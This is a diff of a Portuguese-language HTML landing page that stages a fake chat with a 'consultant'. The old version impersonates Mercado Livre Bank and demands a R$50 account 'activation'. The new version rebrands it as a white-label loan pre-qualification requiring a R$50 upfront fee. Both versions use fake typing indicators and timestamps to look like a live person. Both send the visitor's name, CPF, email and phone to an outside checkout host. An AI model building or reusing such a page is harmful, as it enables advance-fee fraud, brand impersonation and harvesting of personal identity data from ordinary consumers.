@@ -1,418 +1,239 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/all.min.css">
-    <title>Chat Cartão</title>
-    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Sora', sans-serif;
-            background-color: #ebebeb;
-        }
-        .header {
-            display: flex;
-            align-items: center;
-            padding: 10px;
-            border-bottom: 1px solid #aa9900;
-            background-color: #FFE600;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 100;
-        }
-        .header img {
-            width: 125px;
-            padding: 10px;
-        }
-        .chat-container {
-            max-width: 600px;
-            margin: 80px auto 20px;
-            padding: 20px;
-        }
-        .message {
-            margin-bottom: 20px;
-            display: flex;
-            flex-direction: column;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.5s, transform 0.5s;
-            scroll-margin-top: 100px;
-        }
-        .message.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        .message-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 5px;
-            color: #393939;
-            font-size: 15px;
-        }
-        .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            margin-right: 10px;
-            overflow: hidden;
-        }
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .message-content {
-            background-color: white;
-            padding: 15px;
-            border-radius: 7.5px;
-            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
-            max-width: 80%;
-            position: relative;
-            margin-left: 50px;
-            display: none;
-        }
-        .message-content.show {
-            display: block;
-        }
-        .message-content::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: -5px;
-            width: 0;
-            height: 0;
-            border-top: 8px solid white;
-            border-left: 8px solid transparent;
-        }
-        .benefits-list {
-            background-color: #f0f0f0;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 10px 0;
-        }
-        .button {
-            background-color: #FFE600;
-            color: black;
-            padding: 15px;
-            border-radius: 8px;
-            border: none;
-            width: 100%;
-            font-family: 'Sora', sans-serif;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.5s, transform 0.5s;
-        }
-        .button.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-        .message-time {
-            font-size: 11px;
-            color: #8c8c8c;
-            text-align: right;
-            margin-top: 5px;
-        }
-        .typing {
-            display: none;
-            gap: 5px;
-            padding: 10px;
-            background: white;
-            border-radius: 7.5px;
-            width: fit-content;
-            margin-left: 50px;
-            opacity: 0;
-            position: relative;
-        }
-        .typing.show {
-            display: flex;
-            opacity: 1;
-        }
-        .typing::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: -5px;
-            width: 0;
-            height: 0;
-            border-top: 8px solid white;
-            border-left: 8px solid transparent;
-        }
-        .typing span {
-            width: 8px;
-            height: 8px;
-            background: #93959f;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-        }
-        .typing span:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        .typing span:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        @keyframes pulse {
-            0%, 100% {
-                transform: scale(1);
-                opacity: 1;
-            }
-            50% {
-                transform: scale(0.7);
-                opacity: 0.5;
-            }
-        }
-        .message-text {
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .message-text.show {
-            opacity: 1;
-        }
-    </style>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet" />
+  <title>Chat — Empréstimo Pessoal</title>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+  <style>
+    :root{
+      --brand:#FFDD00; /* amarelo estilo Will */
+      --text:#000000;
+      --muted:#6b6b6b;
+      --card:#ffffff;
+      --bg:#f5f5f5;
+      --border:#d9d9d9;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:'Sora',sans-serif;
+      background:var(--bg);
+      color:var(--text);
+    }
+    .header{
+      position:fixed; inset:0 0 auto 0; z-index:100;
+      display:flex; align-items:center; gap:12px;
+      padding:12px 16px;
+      border-bottom:1px solid var(--border);
+      background:var(--brand);
+    }
+    .brandmark{
+      display:flex; align-items:center; gap:10px;
+      font-weight:700; letter-spacing:.3px;
+    }
+    .dot{width:22px; height:22px; border-radius:50%; background:var(--text)}
+    .brandname{font-size:18px}
+    .sub{font-size:11px; opacity:.85; font-weight:400}
+    .chat-container{
+      max-width:640px; margin:88px auto 24px; padding:20px;
+    }
+    .notice{
+      background:#fff9d6; border-left:4px solid var(--brand);
+      padding:14px; margin-bottom:22px; border-radius:6px;
+      box-shadow:0 1px 3px rgba(0,0,0,.08); color:#313131; font-size:14px;
+      display:flex; align-items:center; gap:10px;
+    }
+    .message{margin-bottom:22px; display:flex; flex-direction:column;
+      opacity:0; transform:translateY(16px); transition:opacity .45s, transform .45s; scroll-margin-top:100px;}
+    .message.show{opacity:1; transform:translateY(0)}
+    .message-header{display:flex; align-items:center; gap:10px; margin-bottom:6px; color:#2e2e2e; font-size:15px;}
+    .avatar{width:40px; height:40px; border-radius:50%; overflow:hidden; background:#000; display:grid; place-items:center; color:#FFDD00; font-weight:700}
+    .message-content{background:var(--card); padding:15px; border-radius:9px; box-shadow:0 1px .5px rgba(0,0,0,.12); max-width:83%; position:relative; margin-left:50px; display:none}
+    .message-content.show{display:block}
+    .message-content::before{content:""; position:absolute; top:0; left:-5px; width:0; height:0; border-top:8px solid var(--card); border-left:8px solid transparent;}
+    .message-time{font-size:11px; color:#8c8c8c; text-align:right; margin-top:6px}
+    .typing{display:none; gap:6px; padding:10px; background:var(--card); border-radius:9px; width:fit-content; margin-left:50px; opacity:0; position:relative}
+    .typing.show{display:flex; opacity:1}
+    .typing::before{content:""; position:absolute; top:0; left:-5px; width:0; height:0; border-top:8px solid var(--card); border-left:8px solid transparent;}
+    .typing span{width:8px; height:8px; background:#9da0a6; border-radius:50%; animation:pulse 1s infinite}
+    .typing span:nth-child(2){animation-delay:.2s}
+    .typing span:nth-child(3){animation-delay:.4s}
+    @keyframes pulse{0%,100%{transform:scale(1); opacity:1}50%{transform:scale(.7); opacity:.55}}
+
+    .benefits{background:#fafafa; border:1px dashed var(--border); padding:14px; border-radius:8px; margin:10px 0; font-size:14px}
+    .button{background:var(--brand); color:#000; padding:15px; border-radius:10px; border:none; width:100%; font-weight:700; font-size:16px; cursor:pointer; margin-top:12px; opacity:0; transform:translateY(16px); transition:opacity .45s, transform .45s}
+    .button.show{opacity:1; transform:translateY(0)}
+    .pulse2{animation:pulse2 2s infinite}
+    @keyframes pulse2{0%{box-shadow:0 0 0 0 rgba(255,221,0,.7)}70%{box-shadow:0 0 0 14px rgba(255,221,0,0)}100%{box-shadow:0 0 0 0 rgba(255,221,0,0)}}
+
+    /* selo de transparência */
+    .disclaimer{font-size:12px; color:var(--muted); margin-top:16px; line-height:1.5}
+    a.btnlink{color:inherit; text-decoration:none}
+  </style>
 </head>
 <body>
-    <div class="header">
-        <img src="logo.png" alt="Logo Mercado Livre" class="logo">
+  <div class="header">
+    <div class="brandmark">
+      <div class="dot"></div>
+      <div>
+        <div class="brandname">SuaMarca</div>
+        <div class="sub">Plataforma de Crédito • White-label</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="chat-container">
+    <div class="notice">
+      <strong>Última etapa:</strong> finalize a ativação para liberar a análise do seu empréstimo.
     </div>
 
-    <div class="chat-container">
-        <div style="background-color: #fff8e1; border-left: 4px solid #FFE600; padding: 15px; margin-bottom: 30px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
-            <div style="display: flex; align-items: center;">
-                <i class="fas fa-info-circle" style="color: #FFE600; margin-right: 12px; font-size: 20px;"></i>
-                <span style="color: #313131; font-size: 14px;">
-                    Fique na página! Essa é a última etapa para confirmar o envio do seu cartão!
-                </span>
-            </div>
+    <!-- M1 -->
+    <div class="message" id="m1">
+      <div class="message-header">
+        <div class="avatar">WF</div>
+        <strong>Ana — Consultora de Crédito</strong>
+      </div>
+      <div class="typing"><span></span><span></span><span></span></div>
+      <div class="message-content">
+        <div class="message-text" id="m1txt">
+          Olá! Parabéns pela sua <strong>pré-qualificação</strong> para empréstimo pessoal de até <strong>R$ 15.000</strong> 🎉<br><br>
+          Para liberar a análise final e emissão do contrato, precisamos confirmar sua conta e vincular seus dados.
         </div>
-        <div class="message" id="message1">
-            <div class="message-header">
-                <div class="avatar">
-                    <img src="gerente.png" alt="Juliana Benedito">
-                </div>
-                <strong>Juliana Benedito - Gerente de Contas</strong>
-            </div>
-            <div class="typing"><span></span><span></span><span></span></div>
-            <div class="message-content">
-                <div class="message-text">Olá 😊! Sou a Juliana, sua gerente de conta. Parabéns pelo limite que você conseguiu!<br><br>Mas para que possamos realizar o envio do seu cartão, é necessário uma última etapa, a ativação da sua conta no Mercado Livre Bank!</div>
-                <div class="message-time"></div>
-            </div>
-        <script>
-            // Função para obter o primeiro nome do usuário do localStorage
-            function getNomeUsuario() {
-                try {
-                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
-                    const nomeCompleto = dadosUsuario?.NOME || '';
-                    // Pega apenas o primeiro nome
-                    const primeiroNome = nomeCompleto.split(' ')[0];
-                    return primeiroNome;
-                } catch (error) {
-                    console.error('Erro ao obter nome do usuário:', error);
-                    return '';
-                }
-            }
-
-            // Atualiza a primeira mensagem com o nome do usuário
-            const primeiraMsg = document.querySelector('#message1 .message-text');
-            const nomeUsuario = getNomeUsuario();
-            
-            if (nomeUsuario) {
-                primeiraMsg.innerHTML = `Olá, <strong>${nomeUsuario}</strong> 😊! Sou a Juliana, sua gerente de conta. Parabéns pelo limite que você conseguiu! Mas para que possamos realizar o envio do seu cartão, é necessário uma última etapa, a ativação da sua conta no Mercado Livre Bank! `;
-            }
-        </script>
-        </div>
-
-        <div class="message" id="message2">
-            <div class="message-header">
-                <div class="avatar">
-                    <img src="gerente.png" alt="Juliana Benedito">
-                </div>
-                <strong>Juliana Benedito - Gerente de Contas</strong>
-            </div>
-            <div class="typing"><span></span><span></span><span></span></div>
-            <div class="message-content">
-                <div class="message-text">A ativação da sua conta leva menos de 1 minuto! Com ela ativa, você terá acesso a:
-                    <div class="benefits-list">
-                        ✅ Saque de até 50% do limite<br>
-                        ✅ Pix 24 horas<br>
-                        ✅ Pagamento de boletos<br>
-                        ✅ Cartão Virtual<br>
-                        ✅ Atendimento online 24/7
-                    </div>
-                </div>
-                <div class="message-time"></div>
-            </div>
-        </div>
-
-        <div class="message" id="message3">
-            <div class="message-header">
-                <div class="avatar">
-                    <img src="gerente.png" alt="Juliana Benedito">
-                </div>
-                <strong>Juliana Benedito - Gerente de Contas</strong>
-            </div>
-            <div class="typing"><span></span><span></span><span></span></div>
-            <div class="message-content">
-                <div class="message-text">
-                    <script>
-                        const nome = getNomeUsuario();
-                        const mensagem = `Ativar sua conta é bem simples: basta usá-la pela primeira vez! Pode ser um PIX para um amigo ou pagamento de contas, como: telefone, luz, etc, usando sua nova conta no Mercado Livre Bank 🎉<br><br>Lembrando que o valor mínimo para reconhecermos a ativação da conta é de R$50,00. Esse valor ficará disponível em sua conta para usar como quiser. Após isso, seu limite e o cartão virtual estarão disponíveis`;
-                        document.write(nome ? `${mensagem} para você, ${nome}!` : `${mensagem} para você!`);
-                    </script>
-                </div>
-                <div class="message-time"></div>
-            </div>
-        </div>
-
-        <div class="message" id="message4">
-            <div class="message-header">
-                <div class="avatar">
-                    <img src="gerente.png" alt="Juliana Benedito">
-                </div>
-                <strong>Juliana Benedito - Gerente de Contas</strong>
-            </div>
-            <div class="typing"><span></span><span></span><span></span></div>
-            <div class="message-content">
-                <div class="message-text">Para colocar saldo pela primeira vez em sua conta do Mercado Livre Bank e conseguir <strong>ativar a sua conta, por favor, use o botão abaixo.</strong><br><br>Apenas após concluir essa etapa, podemos realizar o envio do seu cartão!</div>
-                <div class="message-time"></div>
-            </div>
-        </div>
-
-        <button id="btnAtivar" class="button pulse2">Ativar minha conta agora</button>
-        <style>
-            @keyframes pulse2 {
-                0% {
-                    box-shadow: 0 0 0 0 rgba(255, 230, 0, 0.7);
-                }
-                
-                70% {
-                    box-shadow: 0 0 0 15px rgba(255, 230, 0, 0);
-                }
-                
-                100% {
-                    box-shadow: 0 0 0 0 rgba(255, 230, 0, 0);
-                }
-            }
-
-            .pulse2 {
-                animation: pulse2 2s infinite;
-            }
-        </style>
-        <script>
-            function showMessage(messageId, delay) {
-                setTimeout(() => {
-                    const message = document.getElementById(messageId);
-                    const typing = message.querySelector('.typing');
-                    const content = message.querySelector('.message-content');
-                    const text = message.querySelector('.message-text');
-                    const time = message.querySelector('.message-time');
-                    
-                    // Adiciona horário atual
-                    const now = new Date();
-                    const hours = now.getHours().toString().padStart(2, '0');
-                    const minutes = now.getMinutes().toString().padStart(2, '0');
-                    time.textContent = `${hours}:${minutes}`;
-                    
-                    message.classList.add('show');
-                    typing.classList.add('show');
-                    
-                    // Calcula a posição para rolar considerando um offset
-                    const messageTop = message.offsetTop;
-                    const windowHeight = window.innerHeight;
-                    const scrollPosition = messageTop - (windowHeight / 4); // Rola para mostrar a mensagem 1/4 do topo
-                    
-                    // Rola a tela para a posição calculada com smooth scroll
-                    window.scrollTo({
-                        top: scrollPosition,
-                        behavior: 'smooth'
-                    });
-                    
-                    setTimeout(() => {
-                        typing.classList.remove('show');
-                        content.classList.add('show');
-                        text.classList.add('show');
-                        
-                        // Rola novamente após mostrar o conteúdo usando a mesma lógica
-                        const updatedMessageTop = message.offsetTop;
-                        const updatedScrollPosition = updatedMessageTop - (windowHeight / 4);
-                        
-                        window.scrollTo({
-                            top: updatedScrollPosition,
-                            behavior: 'smooth'
-                        });
-                    }, 2000);
-                }, delay);
-            }
-
-            // Mostrar mensagens sequencialmente
-            showMessage('message1', 1500); // +1.5s
-            showMessage('message2', 8000); // +2s
-            showMessage('message3', 18500); // +2.5s
-            showMessage('message4', 28500); // +1.5s
-
-            // Mostrar botão após última mensagem
-            setTimeout(() => {
-                const btnAtivar = document.getElementById('btnAtivar');
-                btnAtivar.classList.add('show');
-                window.scrollTo({
-                    top: document.body.scrollHeight,
-                    behavior: 'smooth'
-                });
-            }, 31500); // Após a última mensagem
-
-            document.getElementById('btnAtivar').addEventListener('click', function() {
-                try {
-                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
-                    const email = localStorage.getItem('email') || '';
-                    const telephone = localStorage.getItem('telefone') || '';
-                    
-                    const baseUrl = 'https://checkout.resolvaagora.chat/VCCL1O8SC39T';
-                    const url = new URL(baseUrl);
-                    
-                    // Adicionar parâmetros do usuário
-                    url.searchParams.append('name', dadosUsuario.NOME || '');
-                    url.searchParams.append('document', dadosUsuario.CPF || '');
-                    url.searchParams.append('email', email);
-                    url.searchParams.append('telephone', telephone);
-                    
-                    // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
-                    const finalUrl = buildUrlWithParams(url.toString());
-                    
-                    window.location.href = finalUrl;
-                } catch(err) {
-                    console.error('Erro ao redirecionar:', err);
-                    window.location.href = buildUrlWithParams('https://checkout.resolvaagora.chat/VCCL1O8SC39T');
-                }
-            });
-        </script>
+        <div class="message-time"></div>
+      </div>
     </div>
 
-    <script>
-        function getUrlParams() {
-            const params = {};
-            const queryString = window.location.search;
-            const urlParams = new URLSearchParams(queryString);
-            
-            for (const [key, value] of urlParams) {
-                params[key] = value;
-            }
-            return params;
-        }
+    <!-- M2 -->
+    <div class="message" id="m2">
+      <div class="message-header">
+        <div class="avatar">WF</div>
+        <strong>Ana — Consultora de Crédito</strong>
+      </div>
+      <div class="typing"><span></span><span></span><span></span></div>
+      <div class="message-content">
+        <div class="message-text">
+          É rápido: a ativação custa <strong>R$ 50,00</strong> (taxa operacional de validação).<br>
+          <div class="benefits">
+            ✅ Prioriza sua análise e assinatura digital<br>
+            ✅ Habilita PIX e contrato em até 24h úteis após conferência<br>
+            ✅ Comprovante fiscal enviado no e-mail cadastrado
+          </div>
+          <small style="color:#6b6b6b">Obs.: a pré-qualificação não garante aprovação final. Sujeito à análise de crédito e documentação.</small>
+        </div>
+        <div class="message-time"></div>
+      </div>
+    </div>
 
-        function buildUrlWithParams(baseUrl) {
-            const params = getUrlParams();
-            const url = new URL(baseUrl, window.location.href);
-            Object.keys(params).forEach(key => {
-                url.searchParams.append(key, params[key]);
-            });
-            
-            return url.toString();
-        }
-    </script>
+    <!-- M3 -->
+    <div class="message" id="m3">
+      <div class="message-header">
+        <div class="avatar">WF</div>
+        <strong>Ana — Consultora de Crédito</strong>
+      </div>
+      <div class="typing"><span></span><span></span><span></span></div>
+      <div class="message-content">
+        <div class="message-text" id="m3txt">
+          Para ativar agora, clique no botão abaixo. Usaremos seus dados salvos (nome, CPF, e-mail e telefone) — você pode revisar na próxima tela antes de pagar.
+        </div>
+        <div class="message-time"></div>
+      </div>
+    </div>
 
-</body></html>
+    <!-- CTA -->
+    <button id="btnAtivar" class="button pulse2">Ativar análise por R$ 50</button>
+
+    <div class="disclaimer">
+      Esta é uma interface <strong>white-label</strong> operada pela <em>SuaMarca</em>. Não é site oficial de bancos de terceiros. 
+      Ao continuar, você concorda com a coleta de dados para análise de crédito e com os Termos/Política de Privacidade da SuaMarca.
+    </div>
+  </div>
+
+  <script>
+    // --------- Helpers (nome do usuário via localStorage) ----------
+    function getNomeUsuario(){
+      try{
+        const u = JSON.parse(localStorage.getItem('dadosUsuario'));
+        const nome = u?.NOME || '';
+        return nome.split(' ')[0] || '';
+      }catch(e){ return '' }
+    }
+
+    function getUrlParams(){
+      const params = {};
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const [k,v] of urlParams) params[k]=v;
+      return params;
+    }
+
+    function buildUrlWithParams(baseUrl){
+      const params = getUrlParams();
+      const url = new URL(baseUrl, window.location.href);
+      Object.keys(params).forEach(k => url.searchParams.append(k, params[k]));
+      return url.toString();
+    }
+
+    // --------- Personalização primeira mensagem ----------
+    const first = document.querySelector('#m1txt');
+    const nomeUsuario = getNomeUsuario();
+    if (nomeUsuario){
+      first.innerHTML = `Olá, <strong>${nomeUsuario}</strong>! Parabéns pela sua <strong>pré-qualificação</strong> para empréstimo pessoal de até <strong>R$ 15.000</strong> 🎉<br><br>Para liberar a análise final e emissão do contrato, precisamos confirmar sua conta e vincular seus dados.`;
+    }
+
+    // --------- Sequência das mensagens + horários ----------
+    function showMessage(id, delay){
+      setTimeout(()=>{
+        const el = document.getElementById(id);
+        const typing = el.querySelector('.typing');
+        const content = el.querySelector('.message-content');
+        const time = el.querySelector('.message-time');
+
+        const now = new Date();
+        time.textContent = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
+
+        el.classList.add('show');
+        typing.classList.add('show');
+
+        const targetTop = el.offsetTop - (window.innerHeight/4);
+        window.scrollTo({top: targetTop, behavior:'smooth'});
+
+        setTimeout(()=>{
+          typing.classList.remove('show');
+          content.classList.add('show');
+
+          const t2 = el.offsetTop - (window.innerHeight/4);
+          window.scrollTo({top: t2, behavior:'smooth'});
+        }, 1600);
+      }, delay);
+    }
+
+    showMessage('m1', 1200);
+    showMessage('m2', 7000);
+    showMessage('m3', 14000);
+
+    // --------- CTA / Checkout ----------
+    const CHECKOUT_URL = 'https://checkout.resolvaagora.chat/VCCL1O8SC39T'; // troque aqui se necessário
+
+    document.getElementById('btnAtivar').addEventListener('click', function(){
+      try{
+        const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+        const email = localStorage.getItem('email') || '';
+        const telephone = localStorage.getItem('telefone') || '';
+
+        const url = new URL(CHECKOUT_URL);
+        url.searchParams.append('name', dadosUsuario.NOME || '');
+        url.searchParams.append('document', dadosUsuario.CPF || '');
+        url.searchParams.append('email', email);
+        url.searchParams.append('telephone', telephone);
+
+        const finalUrl = buildUrlWithParams(url.toString());
+        window.location.href = finalUrl;
+      }catch(err){
+        console.error('Redirecionamento:', err);
+        window.location.href = buildUrlWithParams(CHECKOUT_URL);
+      }
+    });
+  </script>
+</body>
+</html>
